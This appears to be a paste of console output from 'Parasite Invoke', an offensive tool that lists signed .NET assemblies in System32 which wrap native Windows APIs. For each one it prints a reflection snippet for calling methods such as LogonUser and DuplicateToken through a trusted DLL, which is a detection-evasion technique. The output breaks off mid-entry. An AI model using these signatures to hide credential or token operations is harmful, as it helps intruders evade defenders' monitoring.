9JyjcMAH,Untitled,AttackingDirectory,Bash,Thursday 7th of March 2024 02:32:20 PM CDT,"PS A:\SSD\ProjectsVS\Parasite Invoke\Parasite Invoke\bin\Debug> & '.\Parasite Invoke.exe' --path C:\Windows\System32 -r


     . .  .  .  . . .
   .                  .                  _.-/`/`'-._
   . Nice assembly :D .                /_..--''''_-'
    .  .  .  .      .`                //-.__\_\.-'
                `..'  _\\\//  --.___ // ___.---.._
                  _- /@/@\  \       ||``          `-_
                .'  ,\_\_/   |    \_||_/      ,-._   `.
               ;   { o    /   }     ""        `-._`.   ;
              ;     `-==-'   /                    \_|   ;
             |        |>o<|  }@@@}                       |
             |       <(___<) }@@@@}                      |
             |       <(___<) }@@@@@}                     |
             |        <\___<) \_.?@@}                    |
              ;         V`--V`__./@}                    ;
               \      tx      ooo@}                    /
                \                                     /
                 `.                                 .'
                   `-._          Parasite Invoke_.-'
                       ``------'''''''''------``


                Michael Zhmaylo (github.com/MzHmO)
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\cui_dch.inf_amd64_2e49f48165b8de10\igfxSDKLib.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\cui_dch.inf_amd64_2e49f48165b8de10\GfxDownloadWrapper.exe
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\cui_dch.inf_amd64_aa8c460a9b7cf2b9\igfxSDKLib.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\cui_dch.inf_amd64_aa8c460a9b7cf2b9\GfxDownloadWrapper.exe
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\AGS.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\LiteDB.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\Newtonsoft.Json.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\Newtonsoft.Json.Schema.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll

Method: LogonUser
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""LogonUser"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string pszUsername, string pszDomain, string pszPassword, int dwLogonType, int dwLogonProvider, IntPtr& phToken });
        ===END SIGNATURE===

Method: CloseHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""CloseHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle });
        ===END SIGNATURE===

Method: DuplicateToken
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DuplicateToken"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr existingTokenHandle, int impersonationLevel, IntPtr& duplicateTokenHandle });
        ===END SIGNATURE===

Method: OutputDebugString
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""OutputDebugString"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { string message });
        ===END SIGNATURE===

Method: QueryPerformanceCounter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryPerformanceCounter"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { UInt64& lpPerformanceCount });
        ===END SIGNATURE===

Method: QueryPerformanceFrequency
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryPerformanceFrequency"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { UInt64& lpPerformanceFrequency });
        ===END SIGNATURE===

Method: GetCurrentProcessId
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetCurrentProcessId"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: GetModuleFileName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetModuleFileName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr hModule, StringBuilder lpFilename, int nSize });
        ===END SIGNATURE===

Method: CreateFile
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.Win32FileNativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateFile"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        Microsoft.Win32.SafeHandles.SafeFileHandle result = (Microsoft.Win32.SafeHandles.SafeFileHandle) methodInfo.Invoke(null, new object[] { string lpFileName, FileAccess dwDesiredAccess, int dwShareMode, IntPtr lpSecurityAttributes, CreationDisposition dwCreationDisposition, Win32FileAttributes dwFlagsAndAttributes, IntPtr hTemplateFile });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.COMLibrary.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CommunicationService.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll

Method: SetCursorPos
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Util.MousePointerManager"", true);
        var methodInfo = t.GetMethod(""SetCursorPos"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { int x, int y });
        ===END SIGNATURE===

Method: GetCursorPos
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Util.MousePointerManager"", true);
        var methodInfo = t.GetMethod(""GetCursorPos"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { MousePoint& lpPoint });
        ===END SIGNATURE===

Method: EnumDisplayDevices
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""EnumDisplayDevices"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpDevice, int iDevNum, DISPLAY_DEVICE& lpDisplayDevice, int dwFlags });
        ===END SIGNATURE===

Method: EnumDisplaySettings
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""EnumDisplaySettings"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { string lpszDeviceName, int iModeNum, DEVMODE& lpDevMode });
        ===END SIGNATURE===

Method: ChangeDisplaySettingsEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ChangeDisplaySettingsEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Display.Model.DispModeError result = (OneApp.IGCC.CoreLibrary.Display.Model.DispModeError) methodInfo.Invoke(null, new object[] { string lpszDeviceName, DEVMODE& lpDevMode, IntPtr hwnd, CDSFlags dwflags, IntPtr lParam });
        ===END SIGNATURE===

Method: ChangeDisplaySettingsEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ChangeDisplaySettingsEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Display.Model.DispModeError result = (OneApp.IGCC.CoreLibrary.Display.Model.DispModeError) methodInfo.Invoke(null, new object[] { string lpszDeviceName, IntPtr lpDevMode, IntPtr hwnd, CDSFlags dwflags, IntPtr lParam });
        ===END SIGNATURE===

Method: SetDisplayConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetDisplayConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { uint numPathArrayElements, DCPathInfo[] pathArray, uint numModeInfoArrayElements, DCModeInfo[] modeInfoArray, SdcFlags flags });
        ===END SIGNATURE===

Method: QueryDisplayConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryDisplayConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { QueryDisplayFlags flags, UInt32& numPathArrayElements, DCPathInfo[] pathInfoArray, UInt32& modeInfoArrayElements, DCModeInfo[] modeInfoArray, DCTopologyId& topologyId });
        ===END SIGNATURE===

Method: QueryDisplayConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryDisplayConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { QueryDisplayFlags flags, UInt32& numPathArrayElements, DCPathInfo[] pathInfoArray, UInt32& modeInfoArrayElements, DCModeInfo[] modeInfoArray, IntPtr topologyId });
        ===END SIGNATURE===

Method: GetDisplayConfigBufferSizes
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetDisplayConfigBufferSizes"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { QueryDisplayFlags flags, UInt32& numPathArrayElements, UInt32& numModeInfoArrayElements });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCTargetDeviceName& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCTargetBaseType& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCAdapterName& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCSourceDeviceName& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCTargetPreferredMode& preferredMode });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCSupportVirtualResolution& supportVirtualResolution });
        ===END SIGNATURE===

Method: DisplayConfigSetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigSetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCSupportVirtualResolution supportVirtualResolution });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetupDiGetClassDevs
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetClassDevs"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { Guid& ClassGuid, int Enumerator, IntPtr hwndParent, uint Flags });
        ===END SIGNATURE===

Method: SetupDiEnumDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiEnumDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr lpInfoSet, uint dwIndex, SP_DEVINFO_DATA& devInfoData });
        ===END SIGNATURE===

Method: SetupDiEnumDeviceInterfaces
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiEnumDeviceInterfaces"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDevInfo, IntPtr devInfo, Guid& interfaceClassGuid, uint memberIndex, SP_DEVICE_INTERFACE_DATA& deviceInterfaceData });
        ===END SIGNATURE===

Method: SetupDiGetDeviceInterfaceDetail
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDeviceInterfaceDetail"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDevInfo, SP_DEVICE_INTERFACE_DATA& deviceInterfaceData, SP_DEVICE_INTERFACE_DETAIL_DATA& deviceInterfaceDetailData, uint deviceInterfaceDetailDataSize, UInt32& requiredSize, SP_DEVINFO_DATA& deviceInfoData });
        ===END SIGNATURE===

Method: SetupDiOpenDevRegKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiOpenDevRegKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hDeviceInfoSet, SP_DEVINFO_DATA& deviceInfoData, uint scope, uint hwProfile, uint parameterRegistryValueKind, uint samDesired });
        ===END SIGNATURE===

Method: SetupDiGetDevicePropertyW
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDevicePropertyW"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr deviceInfoSet, SP_DEVINFO_DATA& DeviceInfoData, DEVPROPKEY& propertyKey, UInt32& propertyType, IntPtr propertyBuffer, uint propertyBufferSize, UInt32& requiredSize, uint flags });
        ===END SIGNATURE===

Method: SetupDiGetDeviceRegistryPropertyW
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDeviceRegistryPropertyW"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr DeviceInfoSet, SP_DEVINFO_DATA& DeviceInfoData, uint Property, UInt32& PropertyRegDataType, IntPtr PropertyBuffer, uint PropertyBufferSize, UInt32& RequiredSize });
        ===END SIGNATURE===

Method: SetupDiEnumDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiEnumDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr lpInfoSet, uint dwIndex, SP_DEVINFO_DATA devInfoData });
        ===END SIGNATURE===

Method: SetupDiOpenDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiOpenDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr deviceInfoSet, IntPtr deviceInstanceId, IntPtr hwndParent, int openFlags, SP_DEVINFO_DATA deviceInfoData });
        ===END SIGNATURE===

Method: SetupDiGetDeviceRegistryProperty
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDeviceRegistryProperty"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr DeviceInfoSet, SP_DEVINFO_DATA& DeviceInfoData, uint Property, UInt32& PropertyRegDataType, Byte[] PropertyBuffer, uint PropertyBufferSize, UInt32& RequiredSize });
        ===END SIGNATURE===

Method: SetupDiCreateDeviceInfoList
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiCreateDeviceInfoList"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { Guid ClassGuid, IntPtr hwndParent });
        ===END SIGNATURE===

Method: SetupDiDestroyDeviceInfoList
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
